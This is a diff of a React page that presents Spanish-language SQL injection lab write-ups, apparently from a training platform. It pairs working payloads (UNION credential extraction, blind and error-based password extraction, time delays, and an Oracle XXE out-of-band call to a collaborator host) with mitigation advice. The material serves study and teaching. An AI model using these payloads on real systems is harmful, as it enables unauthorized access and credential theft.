@@ -176,9 +176,9 @@ const labsData = [
         level: "Practitioner",
         payload: "' UNION SELECT table_name, NULL FROM all_tables--",
         description: "Alternativa exfiltrativa del esquema base utilizando el diccionario predeterminado de Oracle Database.",
-        objective: "Extraer el nombre de la tabla de usuarios, identificar los  nombres de las columnas, extraer la contraseña del usuario administrator en una base  de datos Oracle y acceder a su cuenta para resolver el reto.",
+        objective: "Extraer el nombre de la tabla de usuarios, identificar los  nombres de las columnas, extraer la contraseña del usuario administrator en una base  de datos Oracle y acceder a su cuenta para resolver el reto.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "de la Vulnerabilidad: La vulnerabilidad se encuentra en el filtro  de categorías. Al ser una base de datos Oracle, la explotación tiene dos reglas críticas:   ue e   SELECT obligatorio: Toda consulta SELECT debe tener una cláusula FROM. Se  utiliza la tabla dual del sistema (FROM DUAL) para pruebas iniciales.  Diccionario de Datos: Los metadatos de las tablas y columnas no están en  information_schema, sino en las tablas del sistema all_tables y all_tab_columns.  Además, Oracle suele manejar los nombres de objetos en MAYÚSCULAS.",
-        impact: "endada  ●​ Sentencias Preparadas: Utilizar consultas parametrizadas para asegurar que el  input del usuario sea tratado siempre como dato y no como parte del comando  ejecutable.  ●​ Restricción de Metadatos: Configurar los permisos de la base de datos para  que el usuario web no tenga privilegios de lectura sobre tablas de sistema como  all_tables o all_tab_columns.  ●​ Validación Estricta: Implementar una arquitectura de \"deny-by-default\" para  parámetros de entrada, permitiendo únicamente valores alfanuméricos simples.",
+        impact: "endada  ●​ Sentencias Preparadas: Utilizar consultas parametrizadas para asegurar que el  input del usuario sea tratado siempre como dato y no como parte del comando  ejecutable.  ●​ Restricción de Metadatos: Configurar los permisos de la base de datos para  que el usuario web no tenga privilegios de lectura sobre tablas de sistema como  all_tables o all_tab_columns.  ●​ Validación Estricta: Implementar una arquitectura de \"deny-by-default\" para  parámetros de entrada, permitiendo únicamente valores alfanuméricos simples.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -275,9 +275,9 @@ const labsData = [
         level: "Apprentice",
         payload: "' ORDER BY 3--",
         description: "Paso inicial fundamental (footprinting) indispensable de un buen ataque de UNION.",
-        objective: "Identificar cuántas columnas está recuperando la  consulta original en la categoría de filtros para poder realizar un ataque UNION  exitoso.  ●​",
+        objective: "Identificar cuántas columnas está recuperando la  consulta original en la categoría de filtros para poder realizar un ataque UNION  exitoso.  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "Para que una sentencia UNION funcione, ambas  consultas deben devolver el mismo número de columnas. Si el atacante intenta  unir una consulta con un número distinto de columnas, la base de datos  devolverá un error. Se utilizan sentencias ORDER BY o UNION SELECT NULL  de forma incremental para hallar el límite.  ●​",
-        impact: "endada: Uso de consultas parametrizadas para evitar que el valor  del filtro de categoría sea interpretado como código SQL.",
+        impact: "endada: Uso de consultas parametrizadas para evitar que el valor  del filtro de categoría sea interpretado como código SQL.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -349,9 +349,9 @@ const labsData = [
         level: "Apprentice",
         payload: "' UNION SELECT NULL, 'a', NULL--",
         description: "Identificando la composición atómica (String/Integer) de las columnas.",
-        objective: "Una vez determinado el número de columnas,  identificar cuál de ellas es capaz de procesar y mostrar datos de tipo cadena  (string).  ●​",
+        objective: "Una vez determinado el número de columnas,  identificar cuál de ellas es capaz de procesar y mostrar datos de tipo cadena  (string).  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "No todas las columnas de una base de datos aceptan  texto (algunas son solo numéricas o fechas). El atacante debe probar inyectando  una cadena de caracteres constante en cada posición de la sentencia UNION  hasta que la aplicación la renderice en la pantalla.  ●​",
-        impact: "Peligro Inminente. Se requiere parchear.",
+        impact: "Peligro Inminente. Se requiere parchear.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -408,9 +408,9 @@ const labsData = [
         level: "Apprentice",
         payload: "' UNION SELECT username, password FROM users--",
         description: "El final de la fase de explotación UNION: Robo frontal masivo de credenciales en columnas compatibles.",
-        objective: "Exfiltrar los nombres de usuario y contraseñas de la  tabla users y utilizarlos para iniciar sesión como administrador.  ●​",
+        objective: "Exfiltrar los nombres de usuario y contraseñas de la  tabla users y utilizarlos para iniciar sesión como administrador.  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "Este ataque permite acceder a tablas que no tienen  relación directa con la funcionalidad original (catálogo de productos). El atacante  \"roba\" el flujo de datos de la página para redirigir información de la tabla de  credenciales hacia la interfaz pública.  ●​",
-        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El  usuario de la base de datos que utiliza la aplicación web no debería tener  permisos de lectura sobre la tabla users o tablas administrativas del sistema.",
+        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El  usuario de la base de datos que utiliza la aplicación web no debería tener  permisos de lectura sobre la tabla users o tablas administrativas del sistema.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -487,9 +487,9 @@ const labsData = [
         level: "Practitioner",
         payload: "' UNION SELECT NULL, username || '~' || password FROM users--",
         description: "Emulando y concatenando outputs en DBs de columnas de string singulares.",
-        objective: "Exfiltrar los nombres de usuario y contraseñas de la tabla  users y utilizarlos para iniciar sesión como administrador.",
+        objective: "Exfiltrar los nombres de usuario y contraseñas de la tabla  users y utilizarlos para iniciar sesión como administrador.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "Este ataque permite al atacante \"robar\" el flujo de datos de la  página para redirigir información de la tabla de credenciales hacia la interfaz pública, en  este caso, mostrando los usuarios y contraseñas donde normalmente se verían los  productos.",
-        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El usuario de la  base de datos que utiliza la aplicación web no debería tener permisos de lectura sobre  la tabla users o tablas administrativas del sistema.",
+        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El usuario de la  base de datos que utiliza la aplicación web no debería tener permisos de lectura sobre  la tabla users o tablas administrativas del sistema.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -596,9 +596,9 @@ const labsData = [
         level: "Practitioner",
         payload: "xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--",
         description: "Ataque lógico a ciegas: formulación de hipótesis lógicas para exfiltración forense remota indirecta.",
-        objective: "Obtener el usuario y la contraseña del administrador de la  tabla users.",
+        objective: "Obtener el usuario y la contraseña del administrador de la  tabla users.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "Este tipo de ataque de inyección SQL no muestra errores o  información directamente en la página. En su lugar, el atacante deduce la información a  través de la respuesta del servidor a consultas condicionales, como la aparición o  ausencia de un mensaje específico en la página (\"Welcome Back\" en este caso) o  diferencias en el tiempo de respuesta. Esto permite al atacante extraer datos carácter  por carácter.",
-        impact: "endada: Validación de entradas y consultas parametrizadas: Utilizar  sentencias preparadas o consultas parametrizadas para separar el código SQL de los  datos de entrada del usuario. Esto previene que los comandos inyectados sean  ejecutados .  Sanitización estricta de entradas: Validar las entradas del usuario contra formatos  esperados y rechazar caracteres maliciosos .  Principio de mínimo privilegio: Configurar las cuentas de base de datos utilizadas  por la aplicación web con los permisos mínimos necesarios. Incluso si ocurre una  inyección, el daño estará limitado.  Manejo de errores no detallado: Evitar mostrar errores detallados de la base de datos  a los usuarios. Los mensajes genéricos impiden que los atacantes confirmen  inyecciones exitosas.  Web Application Firewalls (WAFs): Implementar WAFs con análisis de  comportamiento para detectar patrones indicativos de inyecciones SQL ciegas, como  consultas frecuentes y ligeramente variadas que desencadenan diferentes estados  HTTP o tiempos de respuesta.",
+        impact: "endada: Validación de entradas y consultas parametrizadas: Utilizar  sentencias preparadas o consultas parametrizadas para separar el código SQL de los  datos de entrada del usuario. Esto previene que los comandos inyectados sean  ejecutados .  Sanitización estricta de entradas: Validar las entradas del usuario contra formatos  esperados y rechazar caracteres maliciosos .  Principio de mínimo privilegio: Configurar las cuentas de base de datos utilizadas  por la aplicación web con los permisos mínimos necesarios. Incluso si ocurre una  inyección, el daño estará limitado.  Manejo de errores no detallado: Evitar mostrar errores detallados de la base de datos  a los usuarios. Los mensajes genéricos impiden que los atacantes confirmen  inyecciones exitosas.  Web Application Firewalls (WAFs): Implementar WAFs con análisis de  comportamiento para detectar patrones indicativos de inyecciones SQL ciegas, como  consultas frecuentes y ligeramente variadas que desencadenan diferentes estados  HTTP o tiempos de respuesta.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -925,9 +925,9 @@ const labsData = [
         level: "Practitioner",
         payload: "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
         description: "Uso malicioso y predeterminado del enrutamiento de errores aritméticos para inducir Data Leak.",
-        objective: "Obtener la contraseña del usuario administrador y usarla  para iniciar sesión.",
+        objective: "Obtener la contraseña del usuario administrador y usarla  para iniciar sesión.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "Este tipo de ataque de SQL Injection no muestra los resultados  directamente en la pantalla. En su lugar, se infiere la información observando si la  consulta inyectada provoca un error en la base de datos o si devuelve un código de  estado 200. Al generar errores controlados basándose en condiciones verdaderas o  falsas, se puede determinar la existencia de tablas, usuarios o caracteres específicos  de la contraseña.",
-        impact: "Peligro Inminente. Se requiere parchear.",
+        impact: "Peligro Inminente. Se requiere parchear.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -994,9 +994,9 @@ const labsData = [
         level: "Practitioner",
         payload: "' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--",
         description: "Abuso de un mal manejo de errores del middleware donde el stacktrace refleja contenido literal.",
-        objective: "●​ Extraer la contraseña del usuario “administrator” de la tabla users.  ●​ Realiza un inicio de sesión exitoso con dichas credenciales para  comprometer la cuenta.",
+        objective: "●​ Extraer la contraseña del usuario “administrator” de la tabla users.  ●​ Realiza un inicio de sesión exitoso con dichas credenciales para  comprometer la cuenta.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "El laboratorio presenta una vulnerabilidad en el manejo de  cookies de rastreo (tracking cookies). El flujo de explotación se resume en los  siguientes puntos:  ●​ Punto de Inyección: La aplicación toma el valor de la cookie enviada por  el navegador y lo concatena directamente en una consulta SQL interna.  ●​ Mecanismo de Error: Aunque la aplicación no muestra los resultados  directos de la consulta (los registros de la tabla), está configurada para  mostrar errores detallados de la base de datos cuando una consulta falla.  ●​ Estrategia de Explotación: Se debe inyectar una sintaxis SQL maliciosa  que fuerce un error de conversión o de tipo de dato. Por ejemplo, al  intentar convertir una cadena de texto (la contraseña que queremos  robar) en un número entero, la base de datos generará un error similar a:​ ERROR: invalid input syntax for type integer: \"S3cur3P4ssw0rd\"  ●​ Fuga de Datos (Data Leaking): Al leer ese mensaje de error en la  pantalla, el atacante obtiene el dato que la base de datos intentó procesar  infructuosamente, logrando así \"sacar\" información de tablas a las que no  debería tener acceso.",
-        impact: "endada:  En este escenario, el atacante aprovecha los mensajes técnicos para obtener  información. La estrategia debe ser doble:  ●​ Consultas Preparadas (Sentencias Parametrizadas): Esta es la defensa  principal. En lugar de concatenar la cookie directamente en el string SQL, se usa  un marcador de posición (?). El motor de la base de datos trata el valor de la  cookie como un simple dato y no como parte del código ejecutable.  ●​ Desactivar Mensajes de Error Detallados: En entornos de producción, la  aplicación nunca debe mostrar errores internos del motor de base de datos  (como tipos de datos o nombres de columnas). Se debe configurar una página  de error genérica para el usuario, mientras que el error real se guarda en un log  privado para los desarrolladores.  ●​ Validación de Entrada: Si la cookie de rastreo debe tener un formato específico  (por ejemplo, solo letras y números), se debe validar mediante una expresión  regular antes de procesarla.",
+        impact: "endada:  En este escenario, el atacante aprovecha los mensajes técnicos para obtener  información. La estrategia debe ser doble:  ●​ Consultas Preparadas (Sentencias Parametrizadas): Esta es la defensa  principal. En lugar de concatenar la cookie directamente en el string SQL, se usa  un marcador de posición (?). El motor de la base de datos trata el valor de la  cookie como un simple dato y no como parte del código ejecutable.  ●​ Desactivar Mensajes de Error Detallados: En entornos de producción, la  aplicación nunca debe mostrar errores internos del motor de base de datos  (como tipos de datos o nombres de columnas). Se debe configurar una página  de error genérica para el usuario, mientras que el error real se guarda en un log  privado para los desarrolladores.  ●​ Validación de Entrada: Si la cookie de rastreo debe tener un formato específico  (por ejemplo, solo letras y números), se debe validar mediante una expresión  regular antes de procesarla.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -1218,9 +1218,9 @@ const labsData = [
         level: "Practitioner",
         payload: "x'%3bSELECT+pg_sleep(10)--",
         description: "Inducción de pausas cronometradas y métrica de latencias para comprobar existencia en PostgreSQL.",
-        objective: "Explotar la vulnerabilidad para pausar la ejecución de la  consulta y provocar un retraso de 10 segundos en la respuesta de la aplicación.",
+        objective: "Explotar la vulnerabilidad para pausar la ejecución de la  consulta y provocar un retraso de 10 segundos en la respuesta de la aplicación.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "A diferencia de otros tipos de SQLi, en este caso el servidor ha  sido configurado para no mostrar diferencias visuales si la consulta falla o tiene éxito.  La lógica de ataque se basa en lo siguiente:  ●​ Inyección en la Cookie: Al igual que en el caso anterior, el punto de entrada es  la tracking cookie. El servidor ejecuta la consulta de forma síncrona, lo que  significa que la página web no terminará de cargar hasta que la base de datos  termine su proceso.  ●​ Uso de Funciones de Tiempo: El atacante inserta comandos que obligan a la  base de datos a \"esperar\". Dependiendo del motor de base de datos  (PostgreSQL, MySQL, Microsoft SQL Server), se utilizan funciones como:  ○​ pg_sleep(10)  ○​ WAITFOR DELAY '0:0:10'  ○​ SLEEP(10)  ●​ Confirmación de Vulnerabilidad: Si al enviar la cookie modificada la página  tarda exactamente 10 segundos adicionales en cargar, se confirma que el código  inyectado fue ejecutado por el motor de base de datos.  ●​ Extracción de Datos (Teórica): Aunque el objetivo aquí es solo el retraso, esta  técnica permite extraer información mediante condiciones: \"Si la primera letra de  la contraseña es 'A', espera 10 segundos; si no, responde de inmediato\".",
-        impact: "endada:  Dado que aquí no hay errores visibles, la mitigación se centra en evitar que el atacante  pueda \"comunicarse\" con la base de datos a través del tiempo de respuesta.  ●​ Uso estricto de ORMs o Sentencias Preparadas: Al igual que en el caso  anterior, usar herramientas como Entity Framework, Hibernate o PDO (con  parámetros) evita que comandos como pg_sleep() o WAITFOR DELAY sean  interpretados por la base de datos.  ●​ Limitación de Privilegios (Least Privilege): El usuario de la base de datos que  utiliza la aplicación web no debería tener permisos para ejecutar funciones de  sistema o de administración (como comandos de pausa o apagado) si no son  estrictamente necesarios para su función.  ●​ Web Application Firewall (WAF): Un WAF puede detectar patrones  sospechosos en las cookies, como palabras clave de SQL (SELECT, SLEEP,  UNION), y bloquear la solicitud antes de que llegue a la base de datos.  ●​ Timeouts en Consultas: Configurar un tiempo de espera máximo (timeout) para  las consultas en la base de datos. Si una consulta de una cookie tarda más de lo  normal (por ejemplo, más de 1 segundo), la conexión debe cortarse  automáticamente.",
+        impact: "endada:  Dado que aquí no hay errores visibles, la mitigación se centra en evitar que el atacante  pueda \"comunicarse\" con la base de datos a través del tiempo de respuesta.  ●​ Uso estricto de ORMs o Sentencias Preparadas: Al igual que en el caso  anterior, usar herramientas como Entity Framework, Hibernate o PDO (con  parámetros) evita que comandos como pg_sleep() o WAITFOR DELAY sean  interpretados por la base de datos.  ●​ Limitación de Privilegios (Least Privilege): El usuario de la base de datos que  utiliza la aplicación web no debería tener permisos para ejecutar funciones de  sistema o de administración (como comandos de pausa o apagado) si no son  estrictamente necesarios para su función.  ●​ Web Application Firewall (WAF): Un WAF puede detectar patrones  sospechosos en las cookies, como palabras clave de SQL (SELECT, SLEEP,  UNION), y bloquear la solicitud antes de que llegue a la base de datos.  ●​ Timeouts en Consultas: Configurar un tiempo de espera máximo (timeout) para  las consultas en la base de datos. Si una consulta de una cookie tarda más de lo  normal (por ejemplo, más de 1 segundo), la conexión debe cortarse  automáticamente.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -1306,9 +1306,9 @@ const labsData = [
         level: "Practitioner",
         payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--",
         description: "Bypass agresivo forzando resoluciones asíncronas de OAST y exfiltraciones no convencionales con XML XXE vía SQL.",
-        objective: "Explotar la vulnerabilidad de inyección SQL para forzar una  consulta DNS hacia el servidor de Burp Collaborator.",
+        objective: "Explotar la vulnerabilidad de inyección SQL para forzar una  consulta DNS hacia el servidor de Burp Collaborator.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
         analysis: "de la Vulnerabilidad: La aplicación utiliza una cookie de rastreo  (TrackingId) que es procesada por la base de datos de forma asíncrona. Debido a esto,  la aplicación no devuelve errores ni cambios en el contenido de la página (Blind). Sin  embargo, la base de datos (Oracle) permite el uso de funciones como  EXTRACTVALUE y xmltype que pueden ser manipuladas para realizar peticiones de  red externas (Out-of-band). Al inyectar un ataque de XXE dentro del SQLi, obligamos al  servidor a interactuar con un dominio externo controlado por el atacante.",
-        impact: "endada  ●​ Uso de Sentencias Preparadas (Prepared Statements): Es la defensa más  efectiva. Al usar consultas parametrizadas, la base de datos trata el contenido  de la cookie TrackingId como simple texto y no como código ejecutable.  ●​ Validación y Saneamiento de Entradas: Implementar filtros que verifiquen que  las cookies solo contengan caracteres alfanuméricos esperados, rechazando  cualquier petición que incluya palabras clave de SQL como SELECT o UNION.  ●​ Hardening de la Base de Datos: Configurar el motor de la base de datos  (Oracle) para que el usuario de la aplicación no tenga permisos de realizar  peticiones de red externas o ejecutar funciones XML innecesarias.",
+        impact: "endada  ●​ Uso de Sentencias Preparadas (Prepared Statements): Es la defensa más  efectiva. Al usar consultas parametrizadas, la base de datos trata el contenido  de la cookie TrackingId como simple texto y no como código ejecutable.  ●​ Validación y Saneamiento de Entradas: Implementar filtros que verifiquen que  las cookies solo contengan caracteres alfanuméricos esperados, rechazando  cualquier petición que incluya palabras clave de SQL como SELECT o UNION.  ●​ Hardening de la Base de Datos: Configurar el motor de la base de datos  (Oracle) para que el usuario de la aplicación no tenga permisos de realizar  peticiones de red externas o ejecutar funciones XML innecesarias.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
         steps: [
             {
                 title: "Paso 1",
@@ -1625,8 +1625,8 @@ const SQLInjectionLabs = () => {
                             key={lab.id}
                             onClick={() => setActiveLabId(lab.id)}
                             className={`w-full text-left p-3 rounded-lg transition-all duration-300 border relative overflow-hidden group ${activeLabId === lab.id
-                                    ? 'bg-green-900/20 border-green-500/50 text-white shadow-[0_0_15px_rgba(34,197,94,0.15)] ring-1 ring-green-500/30'
-                                    : 'border-transparent text-gray-400 hover:bg-gray-800/60 hover:text-gray-200'
+                                ? 'bg-green-900/20 border-green-500/50 text-white shadow-[0_0_15px_rgba(34,197,94,0.15)] ring-1 ring-green-500/30'
+                                : 'border-transparent text-gray-400 hover:bg-gray-800/60 hover:text-gray-200'
                                 }`}
                         >
                             {/* Animated indicator for active state */}
@@ -1712,7 +1712,7 @@ const SQLInjectionLabs = () => {
                                 <h4 className="text-violet-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-violet-500/30 pb-2">
                                     EJECUCIÓN DEL LABORATORIO & EVIDENCIA VISUAL
                                 </h4>
-                                <div className="flex flex-col gap-6 w-full max-w-4xl mx-auto">
+                                <div className="flex flex-col gap-6 w-5/6 max-w-3xl mx-auto">
                                     {activeLab.images.map((imgSrc, idx) => (
                                         <div key={idx} className="relative group overflow-hidden rounded border border-gray-700 hover:border-violet-500 transition-colors">
                                             <div className="absolute top-0 left-0 bg-violet-500/80 text-white text-[9px] font-bold px-2 py-0.5 rounded-br z-10">Paso {idx + 1}</div>
@@ -1776,7 +1776,7 @@ const SQLInjectionLabs = () => {
                                             </div>
                                             <div className="pt-1 flex-1">
                                                 <h5 className="text-yellow-400 text-sm md:text-base font-bold mb-2 tracking-wide">{step.title}</h5>
-                                                <p className="text-gray-300 text-xs leading-relaxed mb-3">
+                                                <p className="text-sm leading-relaxed mb-3 text-gray-200">
                                                     {step.text}
                                                 </p>
                                                 {step.code && (
